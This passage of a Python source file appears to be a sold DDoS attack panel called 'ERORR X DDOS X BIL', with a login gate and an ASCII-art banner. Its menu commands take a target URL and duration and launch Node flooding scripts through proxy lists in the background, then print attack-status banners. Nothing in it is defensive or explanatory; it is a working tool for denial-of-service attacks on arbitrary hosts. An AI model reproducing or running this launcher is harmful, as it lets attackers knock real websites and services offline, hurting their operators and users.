\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "browser" or sinput == "BROWSER":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node browser.js {url} 10 proxy.txt 64 {time} true --fin true --load true --headers true --reconnect true --ipv6 true')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m browser\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "https" or sinput == "HTTPS":
			try:
				url = sin.split()[2]
				time = sin.split()[3]
				method = sin.split()[1]
				os.system(f'screen -dm node HTTPS.js {method} {url} {time} 10 64 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HEADER:      \033[31m[ \033[36m{method} \033[31m]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m https\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "vortex" or sinput == "VORTEX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node VORTEX.js {url} {time} 100 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m vortex\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "skynet" or sinput == "SKYNET":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node SKYNET.js {url} {time} 100 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m skynet\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()									
def read_login_data(filename):
    try:
        with open(filename, "r") as file:
            login_data = {}
            for line in file:
                username, password = line.strip().split(":")
                login_data[username] = password
            return login_data
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
        return None
    except ValueError:
        print("Format data login tidak valid.")
        return None

def login(login_data):
    while True:
        os.system('clear')
        print(f'''\033[36m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣶⣦⣤⣰⡄⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢶⣶⣤⣿⣿⣿⣿⣿⣿⣶⣾⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣴⣿⣿⣿⣿⡿⠃⠀⢻⣿⣿⡟⣿⣿⣿⣿⣿⣿⣟⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⠀⠀⠀⠀⠉⠛⣻⣿⣿⣿⡿⠁⠀⠀⠀⢻⣿⡇⠘⡏⢿⣿⣿⣿⣿⡷⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡄⠀⠀⠀⠠⠾⠛⣿⣿⢻⠧⠤⠒⠂⠀⠀⠹⣇⠐⠛⠺⡿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⠀⠀⢠⣾⣿⣿⠸⢀⣠⣤⣄⠀⡇⠀⠈⣶⣦⣤⡁⢹⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀Login To ERORR X DDOS X BIL⠀⠀⠀
⣀⣀⣠⠞⠙⣤⣀⣀⡔⠛⠛⢿⣿⣀⡘⠛⠉⠀⠘⠃⠀⠀⠓⠷⠿⣷⣸⣿⣿⣇⠈⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠙⣦⡞⠉⠀⠀⠀⠀⠀⢸⣿⡙⣿⠶⠚⠉⠉⠉⣉⣉⠙⠋⣓⡿⢹⣿⡿⠀⠀⠀⠀⡆⠀⠀  Buy : @Erorr37cs
⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠈⢿⣧⠸⣾⣿⣿⠿⠿⠿⠿⠿⢿⡿⢁⣿⠟⠁⠀⠀⠀⢀⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⠀⠀⠀⠀⠀⣀⣠⠤⡄⠙⠧⣙⢿⣖⠒⠒⠒⢀⣰⠞⡡⠊⠀⠀⠀⠐⠒⠲⢏⣀⠽⠓⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠀⠀⠀⠀⣾⣿⠏⠉⠁⠀⠀⠈⣳⣮⣭⣒⣋⣭⣴⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣀⣠⣏⣇⣀⡀⠀⠀⢠⣾⣿⡏⠙⢿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡴⠚⠻⢿⣶⡖⣷⡴⣿⠀⣠⣿⣿⡿⠁⠀⠀⠉⠉⢻⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⢁⡴⠒⠶⣿⣧⠿⣤⣿⣷⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠛⣿⣿⣿⣿⠒⠤⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⢿⡥⠒⠒⠢⢤⣿⣿⢛⣿⣿⣿⣿⣿⠓⠦⡀⠀⠀⡠⠔⠚⢻⣿⣿⣿⡆⠀⠀⠀⠀⠑⢄⠀⠀⠀ 𝙴𝚁𝙾𝚁𝚁 𝚇 𝙳𝙳𝙾𝚂 𝚇 𝙱𝙸𝙻 𝙲𝟸 𝙰𝙿𝙸⠀
⠀⣿⢋⣠⠶⢲⣶⣶⣿⠁⣼⢸⣿⣿⣿⣿⠀⠀⠉⠀⡖⠀⠀⠀⠈⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⠛⣏⣠⣴⠚⠿⣿⣿⠊⢸⢸⣿⣿⣿⣿⠀⠀⢀⣾⢀⡀⠀⠀⣰⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠓⠤⣀⠀⠀⠀⠀⠀⠀
⠸⠀⢼⠁⣿⡴⠿⠏⠹⠻⢾⣎⣿⣿⣿⡏⠙⠢⠏⠘⠋⢧⠴⠊⠀⣿⣿⣿⣿⡄⡰⠢⢄⡀⠀⠀⠀⠀⠀⠀⠙⢦⡀⠀⠀⠀
⠀⣆⣀⣾⡏⠉⣩⣏⣿⡋⢋⣿⣿⣿⣿⡇⠀⠀⠀⣀⣀⠀⠀⠀⢰⣿⣿⣿⣿⣷⠃⠀⠀⠈⠲⢄⡀⠀⠀⠀⠀⠀⠙⢶⣄⠀
⠀⣇⠀⠀⢻⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⣀⣤⠿⣷⠀⠀⠀⢸⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠉⠒⢤⡀⠀⠀⠀⠀⠈⢧
⠀⢸⠀⠀⠈⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠛⠋⠁⢠⣶⠉⠁⠀⢼⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠀⠀⢀⡞
⠀⠈⡀⠀⠀⠘⣿⣿⣿⠇⣿⣿⣿⣿⣿⣷⠂⠀⢀⣈⣏⡀⢠⣤⣺⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⡎⠀⠀⠀⠈⠀
⠀⠀⠁⠀⠀⠀⠉⠉⠉⠀⠉⠉⠉⠉⠉⠉⠀⠀⠉⠉⠁⠈⠈⠀⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀
\033[35m
''')
        username = input("Username »  ")
        password = input("Password » ")
        if username in login_data and login_data[username] == password:
            print("Login berhasil🪐!")
            time.sleep(1)
            menu()
            main()
            return
        else:
            print("Username atau password salah. Silakan coba lagi.")

login_filename = "login_data.txt"
login_data = read_login_data(login_filename)

if login_data is not None:
    login(login_data)

